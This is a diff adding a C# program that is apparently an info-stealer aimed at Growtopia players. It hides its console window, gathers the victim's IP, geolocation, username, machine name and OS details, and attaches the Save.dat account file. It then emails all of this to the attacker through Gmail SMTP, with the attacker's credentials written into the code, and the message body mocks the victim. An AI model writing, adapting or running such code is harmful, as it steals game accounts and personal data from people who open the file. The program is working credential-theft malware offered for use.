@@ -1,0 +1,74 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management;
+
+namespace _123
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("Kernel32")]
+        private static extern IntPtr GetConsoleWindow();
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        static void Main(string[] args)
+        {
+            IntPtr hwnd;
+            hwnd = GetConsoleWindow();
+            ShowWindow(hwnd, SW_HIDE);
+            string externalip = new WebClient().DownloadString("http://icanhazip.com");
+            externalip = new System.Net.WebClient().DownloadString("http://bot.whatismyipaddress.com");
+            externalip = new System.Net.WebClient().DownloadString("http://ipinfo.io/ip");
+            string growtopia = "\\Growtopia\\Save.dat";
+            string growtopia2 = "\\Growtopia\\";
+            string kek = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            var kekz = new DirectoryInfo(kek + growtopia2);
+            kekz.Attributes &= ~FileAttributes.ReadOnly;
+            string lol = externalip.ToUpper();
+            string geoip = new WebClient().DownloadString("http://api.predator.wtf/geoip/?arguments=" + externalip);
+            string betterip = "http://api.predator.wtf/geoip/?arguments=" + externalip;
+            string fromEmail; string toEmail; string subject; string body; string gmailUser; string gmailPass; string savedat;
+			//REMEMBER TO ENABLE SO APPS CAN SEND EMAIL!
+            gmailUser = growgemsgt@gmail.com; // CHANGE THIS CHANGE THIS CHANGE THIS
+            gmailPass = grow112233; // CHANGE THIS CHANGE THIS CHANGE THIS
+            toEmail = gmailUser;
+            fromEmail = gmailUser;
+            string userName = Environment.UserName;
+            string computerName = System.Environment.MachineName.ToString();
+            subject = Environment.UserName + " / " + computerName + "s Save.dat - " + Environment.UserName;
+
+            body = "This noob  " + Environment.UserName + " Opened it.\n" + "Some info:\n" + geoip + "\n" + "\n" + "Or check his Info in better format here: " + betterip + "\n" + "Username: " + Environment.MachineName + "\n" + "Windows Build: " + Environment.OSVersion + "\n" + "Location Opened in: " + Environment.CurrentDirectory + "\n" + "Is 64Bit: " + Environment.Is64BitOperatingSystem + "\n" + "\n" + "He gives you this!";
+
+
+
+            savedat = kek + growtopia;
+            MailMessage message = new MailMessage(fromEmail, toEmail, subject, body);
+            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
+
+            smtp.EnableSsl = true;
+            smtp.Credentials = new NetworkCredential(gmailUser, gmailPass);
+
+            if (savedat != string.Empty || savedat != null)
+            {
+                Attachment attach = new Attachment(savedat);
+                message.Attachments.Add(attach);
+            }
+
+            smtp.Send(message);
+            return;
+        }
+
+
+    }
+}
